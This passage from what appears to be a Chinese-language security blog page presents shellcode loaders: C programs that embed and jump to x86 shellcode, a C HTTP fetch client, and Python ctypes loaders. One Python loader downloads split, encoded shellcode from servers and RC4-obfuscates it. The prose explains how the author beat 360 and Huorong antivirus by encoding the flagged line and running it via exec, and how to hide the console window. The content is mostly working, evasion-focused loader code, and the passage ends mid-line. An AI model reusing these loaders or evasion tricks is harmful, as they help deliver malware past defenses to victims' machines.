</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;</span></span><br><span class="line"><span class="string">&quot;\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f&quot;</span></span><br><span class="line"><span class="string">&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm  </span><br><span class="line">    &#123;  </span><br><span class="line">        mov eax,offset shellcode;  </span><br><span class="line">        jmp eax;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;</span></span><br><span class="line"><span class="string">&quot;\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f&quot;</span></span><br><span class="line"><span class="string">&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax,offset shellcode;</span><br><span class="line">        _emit <span class="number">0xFF</span>;</span><br><span class="line">        _emit <span class="number">0xE0</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="c语言-http-get请求"><a href="#c语言-http-get请求" class="headerlink" title="c语言 http get请求"></a>c语言 http get请求</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WINSOCK2.H&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;STDIO.H&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span>  comment(lib,<span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> addr <span class="meta-string">&quot;xx.xx.xx.xx&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> port 80 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> file <span class="meta-string">&quot;testc.txt&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WORD sockVersion = MAKEWORD(<span class="number">2</span>,<span class="number">2</span>);</span><br><span class="line">	WSADATA data; </span><br><span class="line">	<span class="keyword">if</span>(WSAStartup(sockVersion, &amp;data) != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	SOCKET sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">	<span class="keyword">if</span>(sclient == INVALID_SOCKET)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;invalid socket !&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	sockaddr_in serAddr;</span><br><span class="line">	serAddr.sin_family = AF_INET;</span><br><span class="line">	serAddr.sin_port = htons(port);</span><br><span class="line">	serAddr.sin_addr.S_un.S_addr = inet_addr(addr); </span><br><span class="line">	<span class="keyword">if</span> (connect(sclient, (sockaddr *)&amp;serAddr, <span class="keyword">sizeof</span>(serAddr)) == SOCKET_ERROR)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;connect error !&quot;</span>);</span><br><span class="line">		closesocket(sclient);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> message[<span class="number">40</span>] = <span class="string">&quot;GET /&quot;</span>;</span><br><span class="line">	<span class="built_in">strcat</span>(message,file);</span><br><span class="line">	<span class="built_in">strcat</span>(message,<span class="string">&quot; HTTP/1.1\r\nHost: &quot;</span>);</span><br><span class="line">	<span class="built_in">strcat</span>(message,addr);</span><br><span class="line">	<span class="built_in">strcat</span>(message,<span class="string">&quot;\r\n\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> * sendData = message;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,sendData);</span><br><span class="line"></span><br><span class="line">	send(sclient, sendData, <span class="built_in">strlen</span>(sendData), <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">char</span> recData[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">int</span> ret = recv(sclient, recData,<span class="number">1024</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span>(ret &gt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			recData[ret] = <span class="number">0x00</span>;</span><br><span class="line">			<span class="built_in">printf</span>(recData);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	closesocket(sclient);</span><br><span class="line">	WSACleanup();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="python加载器"><a href="#python加载器" class="headerlink" title="python加载器"></a>python加载器</h1><h2 id="1-python3-加载器"><a href="#1-python3-加载器" class="headerlink" title="1 python3 加载器"></a>1 python3 加载器</h2><p>shellcode使用64的，32的改不来</p>
+<p><img src="image-20210511232804832.png" alt="image-20210511232804832"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&quot;shellcode&quot;</span></span><br><span class="line">buf = <span class="built_in">bytearray</span>(buf)</span><br><span class="line"><span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 申请内存</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(buf)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 放入buf</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(buf)).from_buffer(buf)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    buf, </span><br><span class="line">    ctypes.c_int(<span class="built_in">len</span>(buf))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 创建一个线程从buf防止位置首地址开始执行</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="简单免杀"><a href="#简单免杀" class="headerlink" title="简单免杀"></a>简单免杀</h3><p>直接使用肯定报毒，各种报毒（就国内来说）<br>把shellcode加密编码预处理一下，360就过了<br>但是火绒还在报毒</p>
+<p><img src="image-20210512132120592.png" alt="image-20210512132120592"></p>
+<p>怎么办,用从Avic那里学到的,不断fuzz,找到报毒的那一行.一番操作后找到了是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVXWRcjqxL = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.c_uint64(wiseZERld),ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br></pre></td></tr></table></figure>
+<p>这一行的问题,这里可以用编码再解码,用exec运行代码解决</p>
+<p><img src="image-20210512132519070.png" alt="image-20210512132519070"></p>
+<p><img src="image-20210512132544310.png" alt="image-20210512132544310"></p>
+<p>火绒就不拦了,我自己也没想到原来这么简单.真就有手就行</p>
+<h3 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h3><p>运行exe后出现了黑色控制台窗口,用pyinstaller打包的话,这样子就解决了<br>方法一：pyinstaller -F mycode.py –noconsole<br>方法二：pyinstaller -F -w mycode.py （-w就是取消窗口）</p>
+<p>体积太大,我直接-F打包的话,exe有7.5M,没啥解决方法,在写代码的时候导包尽量用from xxx import xxx的方式,</p>
+<h2 id="2-python2-加载器"><a href="#2-python2-加载器" class="headerlink" title="2 python2 加载器"></a>2 python2 加载器</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys, os, hashlib, time, base64</span><br><span class="line"><span class="keyword">import</span> random, string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取随机字符串函数，减少特征</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GenPassword</span>(<span class="params">length</span>):</span></span><br><span class="line">    numOfNum = random.randint(<span class="number">1</span>,length-<span class="number">1</span>)</span><br><span class="line">    numOfLetter = length - numOfNum</span><br><span class="line">    slcNum = [random.choice(string.digits) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numOfNum)]</span><br><span class="line">    slcLetter = [random.choice(string.ascii_letters) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numOfLetter)]</span><br><span class="line">    slcChar = slcNum + slcLetter</span><br><span class="line">    random.shuffle(slcChar)</span><br><span class="line">    getPwd = <span class="string">&#x27;&#x27;</span>.join([i <span class="keyword">for</span> i <span class="keyword">in</span> slcChar])</span><br><span class="line">    <span class="keyword">return</span> getPwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># rc4加解密函数，public_key（公钥）使用GenPassword函数，减少特征</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4</span>(<span class="params">string, op=<span class="string">&#x27;encode&#x27;</span>, public_key=GenPassword(<span class="params"><span class="number">7</span></span>), expirytime=<span class="number">0</span></span>):</span></span><br><span class="line">    ckey_lenth = <span class="number">4</span></span><br><span class="line">    public_key = public_key <span class="keyword">and</span> public_key <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    key = hashlib.md5(public_key).hexdigest()</span><br><span class="line">    keya = hashlib.md5(key[<span class="number">0</span>:<span class="number">16</span>]).hexdigest()</span><br><span class="line">    keyb = hashlib.md5(key[<span class="number">16</span>:<span class="number">32</span>]).hexdigest()</span><br><span class="line">    keyc = ckey_lenth <span class="keyword">and</span> (op == <span class="string">&#x27;decode&#x27;</span> <span class="keyword">and</span> string[<span class="number">0</span>:ckey_lenth] <span class="keyword">or</span> hashlib.md5(<span class="built_in">str</span>(time.time())).hexdigest()[<span class="number">32</span> - ckey_lenth:<span class="number">32</span>]) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    cryptkey = keya + hashlib.md5(keya + keyc).hexdigest()</span><br><span class="line">    key_lenth = <span class="built_in">len</span>(cryptkey)  <span class="comment"># 64</span></span><br><span class="line">    string = op == <span class="string">&#x27;decode&#x27;</span> <span class="keyword">and</span> base64.b64decode(string[<span class="number">4</span>:]) <span class="keyword">or</span> <span class="string">&#x27;0000000000&#x27;</span> + hashlib.md5(string + keyb).hexdigest()[<span class="number">0</span>:<span class="number">16</span>] + string</span><br><span class="line">    string_lenth = <span class="built_in">len</span>(string)</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    randkey = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">255</span>):</span><br><span class="line">        randkey.append(<span class="built_in">ord</span>(cryptkey[i % key_lenth]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">255</span>):</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        j = (j + box[i] + randkey[i]) % <span class="number">256</span></span><br><span class="line">        tmp = box[i]</span><br><span class="line">        box[i] = box[j]</span><br><span class="line">        box[j] = tmp</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(string_lenth):</span><br><span class="line">        a = j = <span class="number">0</span></span><br><span class="line">        a = (a + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[a]) % <span class="number">256</span></span><br><span class="line">        tmp = box[a]</span><br><span class="line">        box[a] = box[j]</span><br><span class="line">        box[j] = tmp</span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(string[i]) ^ (box[(box[a] + box[j]) % <span class="number">256</span>]))</span><br><span class="line">    <span class="keyword">if</span> op == <span class="string">&#x27;decode&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> (result[<span class="number">0</span>:<span class="number">10</span>] == <span class="string">&#x27;0000000000&#x27;</span> <span class="keyword">or</span> <span class="built_in">int</span>(result[<span class="number">0</span>:<span class="number">10</span>]) - <span class="built_in">int</span>(time.time()) &gt; <span class="number">0</span>) <span class="keyword">and</span> result[<span class="number">10</span>:<span class="number">26</span>] == hashlib.md5(</span><br><span class="line">                result[<span class="number">26</span>:] + keyb).hexdigest()[<span class="number">0</span>:<span class="number">16</span>]:</span><br><span class="line">            <span class="keyword">return</span> result[<span class="number">26</span>:]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> keyc + base64.b64encode(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下为shellcode loader代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode字符串经过base64编码再经过hex编码分成三块，存放在某几个服务器上</span></span><br><span class="line"><span class="comment"># get请求方式得到经过编码的shellcode字符串</span></span><br><span class="line">res1 = requests.get(<span class="string">&quot;http://127.0.0.1/shellcode/1.txt&quot;</span>)</span><br><span class="line">res2 = requests.get(<span class="string">&quot;http://127.0.0.1/shellcode/2.txt&quot;</span>)</span><br><span class="line">res3 = requests.get(<span class="string">&quot;http://127.0.0.1/shellcode/3.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</span><br><span class="line">VirtualProtect = ctypes.windll.kernel32.VirtualProtect</span><br><span class="line">whnd = ctypes.windll.kernel32.GetConsoleWindow()</span><br><span class="line"></span><br><span class="line">rcpw = GenPassword(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到经过编码后的shellcode字符串后进行rc4加密，私钥通过GenPassword()函数得到</span></span><br><span class="line"><span class="comment"># 以此减少**，达到内存中不暴露shellcode原始字符串</span></span><br><span class="line">buf = rc4(base64.b64decode((res1.text+res2.text+res3.text).decode(<span class="string">&#x27;hex&#x27;</span>)),<span class="string">&#x27;encode&#x27;</span>,rcpw)</span><br><span class="line">rc4(res2.text,<span class="string">&#x27;encode&#x27;</span>,GenPassword(<span class="number">13</span>))<span class="comment"># 干扰代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里报错了,不知道为啥,看注释应该是干扰用的,就直接注释了</span></span><br><span class="line"><span class="comment"># if whnd != 0:</span></span><br><span class="line"><span class="comment">#     if GenPassword(6) != GenPassword(7):#干扰代码</span></span><br><span class="line"><span class="comment">#         ctypes.windll.use.ShowWindow(whnd, 0)</span></span><br><span class="line"><span class="comment">#         ctypes.windll.kernel32.CloseHandle(whnd)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密shellcode</span></span><br><span class="line">scode = <span class="built_in">bytearray</span>(rc4(buf, <span class="string">&#x27;decode&#x27;</span>, rcpw))</span><br><span class="line">rc4(res2.text+res1.text,<span class="string">&#x27;encode&#x27;</span>,GenPassword(<span class="number">13</span>))<span class="comment"># 干扰代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 申请可读可写不可执行的内存</span></span><br><span class="line">memHscode = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                                      ctypes.c_int(<span class="built_in">len</span>(scode)),</span><br><span class="line">                                                      ctypes.c_int(<span class="number">0x3000</span>),</span><br><span class="line">                                                      ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">rc4(res1.text,<span class="string">&#x27;encode&#x27;</span>,GenPassword(<span class="number">13</span>))<span class="comment"># 干扰代码</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(scode)).from_buffer(scode)</span><br><span class="line">old = ctypes.c_long(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用VirtualProtect将shellcode的内存区块设置为可执行，所谓的渐进式加载模式</span></span><br><span class="line">VirtualProtect(memHscode, ctypes.c_int(<span class="built_in">len</span>(scode)), <span class="number">0x40</span>, ctypes.byref(old))</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memHscode),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(<span class="built_in">len</span>(scode)))</span><br><span class="line">fuck=rc4(GenPassword(<span class="number">7</span>),<span class="string">&#x27;encode&#x27;</span>,GenPassword(<span class="number">13</span>))<span class="comment"># 干扰代码</span></span><br><span class="line">runcode = cast(memHscode, 